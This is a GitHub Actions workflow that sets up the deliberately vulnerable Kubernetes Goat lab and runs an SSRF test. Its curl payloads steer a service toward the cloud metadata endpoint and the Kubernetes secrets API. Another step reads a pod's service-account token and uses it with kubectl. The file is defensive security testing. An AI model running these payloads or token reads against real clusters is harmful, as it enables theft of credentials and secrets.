name: 🛡️ Kubernetes Security Pipeline

on:
  push:
    branches: [master]
  pull_request:
    branches: [master]
  workflow_dispatch:

jobs:
  notifications:
    uses: ./.github/workflows/notification-job.yml
    secrets:
      EMAIL_TO: "saber.fraj@etudiant-isi.utm.tn,najah.wchem@etudiant-isi.utm.tn"
      EMAIL_FROM: ${{ secrets.GMAIL_USERNAME }}
      EMAIL_PWD: ${{ secrets.GMAIL_PASSWORD }}

  security-scan:
    needs: notifications
    uses: ./.github/workflows/scanning-job.yml
    secrets:
      EMAIL_FROM: ${{ secrets.GMAIL_USERNAME }}
      EMAIL_PWD: ${{ secrets.GMAIL_PASSWORD }}
      REPORT_TO: ${{ secrets.REPORT_EMAIL }}

  ssrf-test:
    needs: security-scan
    runs-on: ubuntu-latest
    name: "K8S SSRF Test (Kubernetes Goat Scenario)"
    steps:
      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Setup Kubernetes Goat
        run: |
          chmod +x setup-kubernetes-goat.sh
          ./setup-kubernetes-goat.sh
          kubectl wait --for=condition=Ready pods --all --all-namespaces --timeout=300s

      - name: Identify vulnerable SSRF service
        id: find-ssrf
        run: |
          SSRF_POD=$(kubectl get pods -n default -o jsonpath='{.items[?(@.metadata.labels.app=="ssrf-app")].metadata.name}')
          echo "SSRF_POD=${SSRF_POD}" >> $GITHUB_OUTPUT
          echo "SSRF_SERVICE=$(kubectl get svc -n default -o jsonpath='{.items[?(@.metadata.name=="ssrf-service")].spec.clusterIP}')" >> $GITHUB_OUTPUT

      - name: Exploit SSRF vulnerability
        run: |
          # Test basic SSRF to metadata endpoint
          curl "http://${{ steps.find-ssrf.outputs.SSRF_SERVICE }}?url=http://169.254.169.254/latest/meta-data"

          # Attempt to access Kubernetes API server
          curl "http://${{ steps.find-ssrf.outputs.SSRF_SERVICE }}?url=https://kubernetes.default.svc/api/v1/secrets"

          # Advanced test with DNS rebinding
          curl "http://${{ steps.find-ssrf.outputs.SSRF_SERVICE }}?url=http://kubernetes.default.svc.cluster.local" \
            -H "Host: example.com"

      - name: Verify mitigation
        run: |
          # Check if NetworkPolicies are blocking the attack
          kubectl get networkpolicy -n default --no-headers | grep "deny-external"

          # Verify service account restrictions
          kubectl exec ${{ steps.find-ssrf.outputs.SSRF_POD }} -- \
            cat /var/run/secrets/kubernetes.io/serviceaccount/token | \
            kubectl --token=- auth can-i --list

      - name: Generate SSRF report
        if: always()
        run: |
          echo "SSRF Test Results" > ssrf-report.md
          echo "=================" >> ssrf-report.md
          echo "- Service: ${{ steps.find-ssrf.outputs.SSRF_SERVICE }}" >> ssrf-report.md
          echo "- Pod: ${{ steps.find-ssrf.outputs.SSRF_POD }}" >> ssrf-report.md
          echo "- Metadata API Access: $(curl -s -o /dev/null -w '%{http_code}' 'http://${{ steps.find-ssrf.outputs.SSRF_SERVICE }}?url=http://169.254.169.254/latest/meta-data')" >> ssrf-report.md
          echo "- Kubernetes API Access: $(curl -s -o /dev/null -w '%{http_code}' 'http://${{ steps.find-ssrf.outputs.SSRF_SERVICE }}?url=https://kubernetes.default.svc/api/v1/secrets')" >> ssrf-report.md

      - name: Upload SSRF report
        uses: actions/upload-artifact@v3
        with:
          name: ssrf-test-results
          path: ssrf-report.md

      - name: Send email notification
        if: failure()
        uses: dawidd6/action-send-mail@v3
        with:
          server_address: smtp.gmail.com
          server_port: 465
          username: ${{ secrets.GMAIL_USERNAME }}
          password: ${{ secrets.GMAIL_PASSWORD }}
          subject: "K8S SSRF Vulnerability Detected"
          body: file://ssrf-report.md
          to: ${{ secrets.REPORT_EMAIL }}
          from: ${{ secrets.GMAIL_USERNAME }}
